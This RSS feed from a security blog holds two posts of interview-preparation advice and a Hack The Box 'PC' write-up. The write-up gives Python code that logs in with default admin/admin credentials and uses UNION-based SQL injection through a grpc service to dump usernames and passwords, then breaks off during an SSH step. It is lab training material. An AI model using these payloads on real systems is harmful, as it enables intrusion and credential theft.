<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Bayesian Blogs</title>
        <link>https://baishya.xyz/posts/</link>
        <description>Recent content in Posts on Bayesian Blogs</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sun, 14 Jan 2024 21:51:34 -0800</lastBuildDate>
        <atom:link href="https://baishya.xyz/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Tales from my Product Security Job Hunt: Part 2, Preparation</title>
            <link>https://baishya.xyz/posts/interview-prep/</link>
            <pubDate>Sun, 14 Jan 2024 21:51:34 -0800</pubDate>
            
            <guid>https://baishya.xyz/posts/interview-prep/</guid>
            <description>This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews here
As I mentioned in my previous post, this is catered to my search criteria, which was:
Experience: Mid-level (~4–5 years of experience) Role: Product Security / Application Security Even within the roles I was looking for, different openings had slightly different requirements.</description>
            <content type="html"><![CDATA[<p>This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews <a href="https://www.baishya.xyz/posts/types-of-interviews/">here</a></p>
<p>As I mentioned in my previous post, this is catered to my search criteria, which was:</p>
<ul>
<li>Experience: Mid-level (~4–5 years of experience)</li>
<li>Role: Product Security / Application Security</li>
</ul>
<p>Even within the roles I was looking for, different openings had slightly different requirements. For example, an application security role for a team/company that has a large mobile application footprint is likely to involve duties related to securing these applications — and therefore, the candidate would be expected to know about mobile application security.</p>
<p>The responsibilities and therefore the desired skillset also varied with the size/maturity of the company’s security program. In smaller teams, the responsibilities were broader, whereas in larger teams, the responsibilities were more specialized. I mostly applied to roles with more specialized requirements, based on my interests and skillset. I did explore a few roles that had a broader scope, but since my experience and skills are quite specialized in application/product security, I did not fare well in these interviews — and I decided to look for roles where I would be a good fit.</p>
<p>Most of this post will be specific to roles having one or more of the following as the primary responsibilities:</p>
<ul>
<li>Understanding and triaging security issues including root cause analysis.</li>
<li>Threat modeling and/or security reviews including code reviews.</li>
<li>Building tooling/automation to detect application security issues.</li>
</ul>
<h2 id="technical-interviews">Technical Interviews</h2>
<p>Most companies had multiple technical interviews, starting with basic technical questions and continuing to more in-depth or domain-specific questions. I spent most of my preparation time preparing for technical interviews. Having 4 years of experience in application security, and therefore being constantly exposed to topics in this space was a big help. My preparation in this area was mainly divided into:</p>
<ul>
<li>Topics that I do not work with (or rarely work with).</li>
<li>Revising theoretical aspects of topics I worked with practically, e.g. TLS handshake or OAuth grants.</li>
</ul>
<p>I primarily used the following resources:</p>
<ul>
<li>
<p><a href="https://portswigger.net/web-security"><strong>Portswigger Web Security Academy</strong></a>: This is by far my most used resource. The academy has detailed lessons on almost all topics you are likely to come across when applying for the type of roles I was looking at. The academy also has labs, which help in solidifying the theoretical understanding from going through the lessons. I concentrated on OWASP top 10/CWE top 25 and issues that are being discussed on the news/x.</p>
</li>
<li>
<p><a href="https://tib3rius.com/interview-questions"><strong>Web Security Questions by Tib3rius</strong></a>: A great list of questions of all levels of difficulty.</p>
</li>
<li>
<p><strong>News</strong>: I generally read cybersecurity news and this habit helped me with interview prep. I was able to learn about security concepts that are being discussed actively or issues that adversaries are exploiting. I use a few sources for news:</p>
<ul>
<li><a href="https://tldrsec.com/">tl;dr sec newsletter</a></li>
<li>Blogs from security research organizations like <a href="https://unit42.paloaltonetworks.com/">Palo Alto Networks Unit 42</a>, <a href="https://googleprojectzero.blogspot.com/">Google Project Zero</a>, <a href="https://blog.assetnote.io/">Assetnote</a>, <a href="https://www.zerodayinitiative.com/blog">Trend Micro ZDI</a>, <a href="https://blog.talosintelligence.com/">Cisco Talos Blog</a>, etc.</li>
<li>Social Media (LinkedIn/X)</li>
<li>Medium blogs</li>
</ul>
</li>
<li>
<p><strong><em>Unconventional</em> Sources</strong>: I also find information related to security using some of these non-conventional sources:</p>
<ul>
<li>YouTube: Many hackers/security experts make educational videos on a variety of security-related topics. Some of my favorites are: <a href="https://www.youtube.com/@ippsec">IppSec</a>, <a href="https://www.youtube.com/@LiveOverflow">LiveOverflow</a>, <a href="https://www.youtube.com/@_JohnHammond">John Hammond</a>, <a href="https://www.youtube.com/@BugBountyReportsExplained">Bug Bounty Reports Explained</a>, <a href="https://www.youtube.com/@NahamSec">NahamSec</a></li>
<li><a href="https://hackerone.com/hacktivity/overview">HackerOne hacktivity</a>: Reading through bug bounty disclosures can provide insights into possible ways to exploit vulnerabilities. Some of the reports are very creative.</li>
</ul>
</li>
</ul>
<p><strong>Books</strong>: Although I did not use these books specifically for interview preparation, I have learned a lot from them.</p>
<ul>
<li>The Tangled Web — Michal Zalewski</li>
<li>Computer Security, A Hands-on Approach — Wenliang Du</li>
<li>The Web Application Hackers Handbook — Dafydd Stuttard and Marcus Pinto</li>
<li>Cryptography and Network Security — William Stallings</li>
<li>The Hacker Playbook — Peter Kim</li>
</ul>
<p><strong>Practical Exploitation Practice</strong>: I feel I learn better by doing things. So I try my hand at CTFs or platforms like HackTheBox, TryHackMe, PortSwigger Web Security Academy, and others. I did not do these specifically for the interviews, it is just something I do sometimes to sharpen my skills.</p>
<h2 id="code-review">Code Review</h2>
<p>Due to my interest in static analysis, I looked at a lot of code for security flaws at work. This prepared me for the code review interviews. Here are some tips that might be helpful:</p>
<ul>
<li>
<p>Have a checklist of things to look for. <a href="https://github.com/mgreiler/secure-code-review-checklist">This</a> GitHub repo provides a great list that you can adapt for yourself.</p>
</li>
<li>
<p>Practice with some known vulnerable apps. There are many to choose from:</p>
<ul>
<li><a href="https://github.com/juice-shop/juice-shop">Juice Shop</a></li>
<li><a href="https://github.com/digininja/DVWA">DVWA</a></li>
<li><a href="https://github.com/WebGoat/WebGoat">WebGoat</a></li>
<li>Many more are listed <a href="https://github.com/vavkamil/awesome-vulnerable-apps">here</a></li>
</ul>
</li>
<li>
<p>Semgrep Playground has an option to try out existing rules. The rule test has code that Semgrep will flag, and code it will not. Assuming the rule is correct, the code that Semgrep will flag will be vulnerable, and therefore you can use that to understand vulnerable patterns.</p>
</li>
</ul>
<h2 id="threat-modeling-interview">Threat Modeling Interview</h2>
<p>To be good at threat modeling, you will first need to have good technical knowledge. If you know how certain issues can impact systems, when you see a system that has these deficiencies, you can identify the issues. The next step would be to identify a threat modeling process that works best for you. There is no best method, but in my experience the most popular is STRIDE. There are other frameworks too like DREAD or PASTA. You can practice by looking at architectures and enumerating threats in them. You can also take an application (eg: a restaurant reservation system) and list potential threats in such an application.</p>
<p>Here are some resources to prepare for threat modeling interviews:</p>
<ul>
<li><a href="https://shostack.org/resources/threat-modeling">The Ultimate Beginner’s Guide to Threat Modeling</a></li>
<li><a href="https://owasp.org/www-community/Threat_Modeling_Process">Threat Modeling Process</a></li>
<li><a href="https://threat-modeling.com/the-ultimate-list-of-stride-threat-examples/">List of example STRIDE threats</a></li>
<li><a href="https://shostack.org/blog/category/threat-model-thursday">Shostack + Associates “Threat Model Thursday” Series</a></li>
</ul>
<h2 id="coding-interview">Coding Interview</h2>
<p>I did not prepare much for coding interviews since the roles I was interested in did not have a coding interview. I relied on my coding skills from work or leisure projects to attempt the very few coding interviews I had. There are already many resources on the internet that provide detailed preparation guides for coding interviews. Please refer to them for coding interview guidance.</p>
<h2 id="behavioral-interview">Behavioral Interview</h2>
<p>Preparing for a behavioral interview involves understanding the format and anticipating questions that assess your past behavior in certain situations. It is important to have personal examples ready for commonly asked behavioral questions. There are many lists of common behavioral questions that you can look at, or you can ask ChatGPT to provide some examples. Using the STAR method is a great way to answer behavioral questions. STAR stands for Situation, Task, Action, and Result. Here’s an example (courtesy of ChatGPT):</p>
<p><em>Can you provide an example of a time when you had to overcome a significant challenge in a team project?</em></p>
<p><em>Situation</em>: In my previous role as a project manager, our team was tasked with implementing a new software system within a tight deadline.</p>
<p><em>Task</em>: One of the key challenges was that we faced unexpected technical issues during the implementation phase, jeopardizing the project timeline.</p>
<p><em>Action</em>: Recognizing the urgency, I immediately called for a team meeting to discuss the issues openly. I assigned specific tasks to team members based on their expertise, ensuring everyone had a clear role in addressing the technical challenges. Simultaneously, I collaborated with the IT department to expedite troubleshooting.</p>
<p><em>Result</em>: Through our collaborative efforts, we successfully identified and resolved the technical issues within the deadline. This experience highlighted the importance of effective communication and swift problem-solving. As a result, our team developed stronger bonds and increased our overall efficiency in handling unexpected challenges.</p>
<h2 id="leadership-interviews">Leadership Interviews</h2>
<p>I am clubbing interviews with the manager, director, or more senior leadership in this section. In general, I felt these were more conversations than interviews — to understand my experiences and interests and to tell me more about the role or the company. Be prepared to answer questions about your experiences and background, why you are looking for a change, and what interests you in the company. It helps to familiarize yourself a little with the products or services the company offers. There might be some technical questions involved. I have already covered above how you can prepare for these.</p>
<h2 id="general-tips">General Tips</h2>
<p>Some general tips that might help with the preparation or interview:</p>
<ul>
<li>Read the job description thoroughly. The technical interviews were almost always related to the responsibilities mentioned in the job description.</li>
<li>Ask the recruiter about the interview process — how many rounds will be there, what each round will entail, how long you can expect the process to take, and if they have any preparation tips.</li>
<li>Ask questions to your interviewers. Some examples: what challenges they face, what tasks/projects they find most interesting, why they enjoy working at the company, and so on. If you are speaking with the manager or leadership, ask them about their leadership style, what specific tasks you might work on, how they promote employee growth, and so on.</li>
<li>Be honest. If you don’t know something, let your interviewer know about it. Take a guess based on what you know — but be sure to inform your interviewer.</li>
<li>Try to keep calm. Interviews can be nerve-wracking, especially if you feel they are not going well. Even if you are not able to answer anything, keeping calm will let you think much better and take educated guesses. The interviewers might not be expecting you to know everything — and they might want to understand how you think or approach problems.</li>
<li>Try to free up your schedule at work. Since panel interviews will likely be multiple interviews within a day or two, you will need to have a few hours free on various days. Therefore, plan your work ahead of time. Make sure once you are actively interviewing, you have a good number of available slots.</li>
<li>Self-analyze your performance after an interview. Determine what areas you did well on and what areas you need to spend more time preparing. The first few interviews for me did not go very well — because I did not know what to expect in terms of questions, and also how well I had prepared. From them, I was able to prepare better for the upcoming interviews.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Tales from my Product Security Job Hunt: Part 1, Interview Types</title>
            <link>https://baishya.xyz/posts/types-of-interviews/</link>
            <pubDate>Sun, 07 Jan 2024 16:12:46 -0800</pubDate>
            
            <guid>https://baishya.xyz/posts/types-of-interviews/</guid>
            <description>After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.
Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences.</description>
            <content type="html"><![CDATA[<p>After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.</p>
<p>Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences. Therefore, I am writing this two-part series that will talk about the types of interviews I attempted, and how I prepared for them. This blog in particular will list the types of interviews. In the next one, I will talk about my preparation and provide some tips that worked for me.</p>
<p>This list is specifically catered to the type of positions I was interviewing for. The interview rounds you have will vary according to your search criteria. My criteria:</p>
<ul>
<li>Experience: Mid-level (~4–5 years of experience)</li>
<li>Role: Product Security / Application Security</li>
</ul>
<h2 id="interview-process">Interview Process</h2>
<p>The interview process varied by company, but the general framework was:</p>
<ul>
<li>Recruiter call</li>
<li>Basic technical interview</li>
<li>Virtual panel-style interviews</li>
</ul>
<p>In some cases, I spoke to the hiring manager before the first technical interview.</p>
<p>After the basic technical round, the next few rounds were often set up in a “virtual panel” style. This means they were set up concurrently (as opposed to a sequential setup where the next interview is set only if I perform well in the first).</p>
<p>Since the interview process varies a lot by company. I would recommend speaking with the recruiter regarding the process, specifically how many rounds to expect and what type of interviews they will be.</p>
<h2 id="recruiter-call">Recruiter call</h2>
<p>Typically, the first person you’d speak to will be a recruiter. In most cases, this is not an interview. The recruiter provides more information about the job role and the team. They might have a conversation about compensation expectations, visa requirements, and other administrative items. You may ask them for interview preparation guidance too. I have received great pointers regarding areas to concentrate on!</p>
<p>At times the recruiter also asked very basic security questions. Some questions include:</p>
<ul>
<li>What is (XSS, SQLi, CSRF, …, or any other common security issue)?</li>
<li>Difference between encryption and hashing.</li>
<li>How to store passwords in a DB.</li>
</ul>
<h2 id="basic-technical-interview">Basic Technical Interview</h2>
<p>The first interview round was always a basic technical interview. We discussed common security issues and their mitigations (think OWASP top 10). Since I was interviewing for a mid-level position, I was expected to answer in-depth questions about security issues/concepts rather than just the definitions or basic mitigation steps. Some examples of questions I was asked:</p>
<ul>
<li>What are the types of XSS? How can you mitigate DOM XSS?</li>
<li>How can you prevent CSRF in a case where we cannot use CSRF tokens?</li>
<li>What is the principle behind using prepared statements for SQL injection mitigation?</li>
<li>If using AES for encryption, which mode would you prefer between ECB, CBC, or GCM, and why?</li>
<li>Explain a TLS handshake. (This seems to be a favorite amongst interviewers. I think this was the most commonly asked question.)</li>
<li>What is the same origin policy and how does CORS relate to it? (Another favorite.)</li>
</ul>
<p>The basic technical interview occasionally included questions about my resume (the other place where I was asked about my resume was during the manager interview). One of my interviewers and I shared a deep interest in static analysis and supply chain security — so we spent quite a bit of the interview talking about it!</p>
<h2 id="manager-interview">Manager Interview</h2>
<p>I spoke with the hiring manager at the beginning of the application process for most of the roles. However, for a few positions, the manager interview occurred later, specifically during the panel interviews.</p>
<p>Generally, the conversation was aimed at understanding my general background and experience, and I was provided insights into what tasks I would work on if I joined. The general idea was to make sure my expectations were in line with what the role had to offer and vice-versa. Some included basic technical questions. Others included questions that tested the ability to think of scalable solutions or design initiatives. For eg: I was given some of the challenges the team faced and asked how I would approach them.</p>
<h2 id="deeper-technical-interview">Deeper Technical Interview</h2>
<p>Wherever I made it to the next round, I had at least one deeper technical interview. This either consisted of going very deep into one or two common security issues or questions about security issues that are not as common (or not in the OWASP top 10). There might be scenario-based questions or domain-specific questions in this interview too. For eg, if you are applying to a role that requires knowledge of mobile application security, you will likely be asked about mobile-specific items.</p>
<p>Let’s take an example of XSS. The interviewer might first start with basic XSS questions like types of XSS, the difference between them, and so on. The more technical questions might include:</p>
<ul>
<li>If using CSP, how can you still allow some inline JavaScript to run?</li>
<li>If using CSP nonce, how should the nonce be generated and set?</li>
<li>Given a code snippet and some disallowed characters, is XSS possible in the scenario? Provide a payload.</li>
<li>How does output sanitization help in mitigating XSS? Why is it better than input encoding?</li>
</ul>
<p>Some other security concepts/issues I was asked about:</p>
<ul>
<li>Insecure deserialization (including providing an example in a language of choice).</li>
<li>XML external entities (XXE).</li>
<li>NoSQL Injection.</li>
<li>Memory-based issues (buffer/heap overflow, use after free, double free).</li>
<li>OAuth and its grant types.</li>
</ul>
<h2 id="code-review">Code Review</h2>
<p>The premise of the code review interview is to understand if by looking at code, you can identify security issues. I have been asked to review code at various stages of the interview process. Most often it is a part of the deeper technical interview. The basic technical interview can also sometimes include some basic code review. At one company, I had a dedicated code review interview. The things I had to look for (or rather, things I found) include XSS, SQL/NoSQL injection, authentication/authorization bypass, and missing security controls.</p>
<p>Not every code review was in a language I was familiar with, so you might have to read code in a language new to you. For the most part, they were still common languages with syntax I could more or less understand. Whenever I had a language I had not worked with, I informed the interviewer about it. They were happy to answer any language-specific questions I had, e.g. if I was unfamiliar with a certain function or certain way a statement was written. Languages I looked at include Python, Ruby, C, and Java. (One interviewer gave me a choice of Python, JavaScript, and a few others, I chose Python.)</p>
<h2 id="threat-modeling">Threat Modeling</h2>
<p>In nearly every company I interviewed with, I had to threat model a given system. Sometimes it was included in the deeper technical interview, other times it was a dedicated interview. I encountered two kinds of threat modeling questions:</p>
<ul>
<li>Abstract — I was asked to list potential threats in an application (eg: restaurant reservation system). This did not include any diagrams or workflows. My approach here was to list potential issues — and ask the interviewer if they wanted me to elaborate on anything. Based on what I listed, the interviewers asked me follow-up questions.</li>
<li>Specific — I was given either architecture diagrams or sequence diagrams and sometimes implementation details and I had to find issues that exist in the given service. The service in question would be much smaller in scope as compared to the abstract case (eg: the service in the restaurant reservation system that takes input from restaurants and generates the listing for users). In this case, I could not just list potential issues in the service. I had to show how the malicious payload might enter the system, where it would be triggered, and what parts it would impact.</li>
</ul>
<p>The interviewer might add additional scenarios or caveats to the service after the initial walkthrough. Some interviewers asked me to conduct the threat modeling as if I were working with a software engineer who was building the given service, and I was performing the security review. This meant I had to ask questions about the service or provide recommendations without using too much security jargon.</p>
<h2 id="behavioral">Behavioral</h2>
<p>Almost all companies had a behavioral round. Some had multiple rounds. I was asked general behavioral questions like:</p>
<ul>
<li>Can you give an example of a project or task that didn’t go as planned? What did you do to address the issues and what was the outcome?</li>
<li>Tell me about a time when you had to adapt to a major change at work. How did you approach it?</li>
<li>Give me an example of a time when you had to prioritize multiple tasks or projects. How did you decide what to focus on first?</li>
<li>Describe a time when you had to learn a new skill or technology quickly. How did you go about it, and how did it impact your work?</li>
<li>Can you share a situation where you faced a challenging problem at work? What steps did you take to analyze and solve it?</li>
<li>Generally, these interviews were taken by someone not on the immediate team I was applying for.</li>
</ul>
<h2 id="coding">Coding</h2>
<p>I have seen coding rounds being asked for roles that require building tooling or implementing security features. Since I was not looking for a role like that, most companies I applied to did not have a coding round. In the few that had, the questions were of two types:</p>
<ul>
<li>Leetcode easy/easy-medium type questions.</li>
<li>General scripting questions that tested familiarity with a language of choice.</li>
</ul>
<p>My understanding, from the explanations of the interviewers, is that they had a few projects that required some amount of coding so they wanted a candidate who was comfortable writing small scripts or building simple automated tools. They were not looking for a very proficient coder since coding was a small part of the responsibilities.</p>
<h2 id="director--leadership-conversations">Director / Leadership Conversations</h2>
<p>More often than not, I had the opportunity to speak to the director of the team that was hiring. This was much later in the interview process, typically after I had completed the technical rounds. It was similar to the conversation with the manager — questions about my background and what I was looking for in my next role.</p>
<p>In a few rare instances, I had conversations with senior leadership including CTOs and/or CISOs. Although I was very nervous about speaking to senior leadership — they usually just wanted to get to know me and what I was looking for role / career-wise.</p>
<h2 id="funinteresting-questions">Fun/Interesting questions</h2>
<p>During my interviews, I was asked some fun/interesting questions. These don’t fall into any one interview in particular. They are not difficult questions, just things I was not prepared to answer or had never thought about — so they caught me slightly off guard.</p>
<ul>
<li>What is your favorite security vulnerability to work on?</li>
<li>What is the last thing you learned? (The interviewer specified it did not have to be security or tech-related, I still spoke about some CVE…)</li>
<li>What is something that you can teach me in the next 2 minutes (Again, the interviewer did not want a security or tech-related answer. If you know any party tricks, they will probably be a hit! I sadly did not know any.)</li>
<li>Questions about my hobbies: It is possible that you and your interviewer share hobbies. I did, and I was asked about some specifics. Since I was not expecting a question about my hobbies, it took me a few moments to gather my thoughts.</li>
</ul>
<hr>
<p>I hope you found this useful. Do check out part 2, where I talk more about the interview prep. If you have any questions or need any help with interview prep, don’t hesitate to reach out to me (preferably on LinkedIn).</p>
]]></content>
        </item>
        
        <item>
            <title>Hack the Box — PC, but automated</title>
            <link>https://baishya.xyz/posts/htb-pc/</link>
            <pubDate>Mon, 06 Nov 2023 20:05:09 -0800</pubDate>
            
            <guid>https://baishya.xyz/posts/htb-pc/</guid>
            <description>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</description>
            <content type="html"><![CDATA[<p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
<p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel.</em></p>
<p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
<p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
<h2 id="setup-grpc">Setup grpc</h2>
<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I../../protos --python_out<span style="color:#f92672">=</span>. --pyi_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. SimpleApp.proto
</span></span></code></pre></div><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
<p>Once we have the required files generated, we can connect to the grpc service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setup_grpc</span>(self):
</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>grpc_port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    stub <span style="color:#f92672">=</span> pb2_grpc<span style="color:#f92672">.</span>SimpleAppStub(channel)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> stub
</span></span></code></pre></div><p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to protobuf-defined grpc services.</p>
<h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
<p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query) 
</span></span></code></pre></div><p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service. The above request will get the tables from <code>sqlite_master</code>.</p>
<p>This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The username/password is conveniently set to admin/admin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_token</span>(self):
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>LoginUserRequest(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>)
</span></span><span style="display:flex;"><span>    _, call <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>LoginUser<span style="color:#f92672">.</span>with_call(user)
</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> call<span style="color:#f92672">.</span>trailing_metadata()
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> metadata[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>value[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
</span></span></code></pre></div><p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_users</span>(self) <span style="color:#f92672">-&gt;</span> dict:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Getting users&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>    table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;</span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>    cols <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> cols<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>):
</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(</span><span style="color:#e6db74">{</span>col<span style="color:#e6db74">}</span><span style="color:#e6db74">) FROM </span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    passwords <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(usernames)):
</span></span><span style="display:flex;"><span>        users<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;username&#34;</span>: usernames[i], <span style="color:#e6db74">&#34;password&#34;</span>: passwords[i]})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Users found&#34;</span>)
</span></span><span style="display:flex;"><span>    print(json<span style="color:#f92672">.</span>dumps(users))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> users
</span></span></code></pre></div><p>The <code>_sql_injection_request</code> function is defined as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sql_injection_request</span>(self, query):
</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;token&#34;</span>, self<span style="color:#f92672">.</span>token),)
</span></span><span style="display:flex;"><span>    id_request <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>getInfo<span style="color:#f92672">.</span>with_call(id_request, metadata<span style="color:#f92672">=</span>metadata)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>message
</span></span></code></pre></div><h2 id="getting-user-flag">Getting user flag</h2>
<p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>. This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code> library and executed <code>cat /home/sau/user.txt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_command</span>(self, command):
